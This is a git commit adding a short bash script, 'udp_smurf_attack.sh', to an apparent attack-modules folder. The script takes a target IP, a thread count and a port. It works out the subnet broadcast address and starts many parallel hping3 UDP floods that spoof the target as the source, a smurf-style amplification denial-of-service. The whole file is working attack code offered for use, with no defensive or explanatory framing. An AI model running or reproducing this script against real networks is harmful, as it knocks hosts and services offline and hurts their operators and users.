cbbccd9629f81cf45d504d44120078ee1e753ca1
Ágora <157940163+agoralatam@users.noreply.github.com>
2024-11-19 21:01:52 -0500

    Add files via upload

---
+++ modules_attack/udp_smurf_attack.sh
@@ -0,0 +1,20 @@
+#!bin/bash
+
+RED='\033[0;31m'
+YELLOW='\033[1;33m'
+MAGENTA='\033[0;35m'
+NC='\033[0m'
+
+target=$1
+threads=$2
+port=$3
+broadcast=$(ipcalc -b "$target"/24 | grep 'Broadcast' | awk '{print $2}')
+
+for i in $(seq 1 $threads); do
+        hping3 -2 -a $target $broadcast --flood -p $port > /dev/null 2>&1 &
+        echo -e "${YELLOW}[+]${MAGENTA} Thread $i started${NC}"
+done
+
+echo -e  "\n${MAGENTA}To stop the attack press,${YELLOW} CTRL + C${NC}"
+
+wait
